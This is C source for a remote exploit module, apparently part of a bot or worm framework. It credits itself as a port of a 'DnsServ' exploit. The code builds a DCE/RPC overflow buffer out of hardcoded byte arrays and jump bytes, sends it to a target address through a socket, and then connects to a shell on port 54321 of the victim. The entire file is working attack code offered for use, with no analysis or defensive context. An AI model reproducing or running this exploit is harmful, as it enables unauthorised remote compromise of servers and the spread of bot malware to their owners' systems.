
/* DnsServ Exploit Ported by doyley orginal by Devcode :) */ 
#include "include.h" 
#include "extern.h" 

#pragma warning(disable : 4305) 
#pragma warning(disable : 4309) 

unsigned char uszDceBind[] = 
       "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00" 
       "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00" 
       "\xA4\xC2\xAB\x50\x4D\x57\xB3\x40\x9D\x66\xEE\x4F\xD5\xFB\xA0\x76" 
       "\x05\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00" 
       "\x2B\x10\x48\x60\x02\x00\x00\x00"; 

unsigned char uszDceCall[] = 
       "\x05\x00\x00\x83\x10\x00\x00\x00\x7f\x06\x00\x00\x01\x00\x00\x00" 
       "\x57\x06\x00\x00\x00\x00\x01\x00\xa4\xc2\xab\x50\x4d\x57\xb3\x40" 
       "\x9d\x66\xee\x4f\xd5\xfb\xa0\x76\x10\xc2\x40\x00\x02\x00\x00\x00" 
       "\x00\x00\x00\x00\x02\x00\x00\x00\x44\x00\x00\x00\x94\xfa\x13\x00" 
       "\xcc\x04\x00\x00\x00\x00\x00\x00\xcc\x04\x00\x00"; 

unsigned char uszDceEnd1[] = 
       "\x41\x00\xb8\xc0\x40\x00\x57\x01\x00\x00\x00\x00\x00\x00\x57\x01" 
       "\x00\x00"; 

unsigned char uszJmps[] = 
       "\x5C\x29\x5C\x4C\x5C\xE1\x5C\x77" 
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42" 
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42" 
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42" 
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42" 
       "\x5C\x42\x5C\xFF\x5C\xE2"; 

#pragma warning(default : 4305) 
#pragma warning(default : 4309) 

unsigned int __stdcall dns_exploit(void *param) 
{ 
   int fd; 
    char mkdir_buff[1663]; 
   struct sockaddr_in target; 
   struct exploits exploit = *(struct exploits *)param; 
   struct exploits *pexploit = (struct exploits *)param; 
   pexploit->gotinfo = true; 
   if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
   { 
      _endthreadex(0); 
      return 0; 
   } 
   target.sin_family = AF_INET; 
   target.sin_addr.s_addr = exploit.ip; 
   target.sin_port = htons(exploit.port); 
   memset(target.sin_zero, 0, 8); 
    
   if(connect(fd, (struct sockaddr *)&target, sizeof(target)) == -1) 
   { 
      _endthreadex(0); 
      return 0; 
   } 
      memset( mkdir_buff, 0x5C, sizeof( mkdir_buff ) ); 
      memcpy( mkdir_buff, uszDceCall, sizeof( uszDceCall ) - 1 ); 
      memcpy( mkdir_buff + 1006, uszJmps, sizeof( uszJmps ) - 1 ); 
      memcpy( mkdir_buff + 1302, uszDceEnd1, sizeof( uszDceEnd1 ) ); 

   sendto(fd,mkdir_buff,sizeof(mkdir_buff),0,(struct sockaddr *)&target,sizeof(target)); 
   shell_connect(exploit.ip, 54321); 
   closesocket(fd); 
   _endthreadex(0); 
   return 0; 
} 
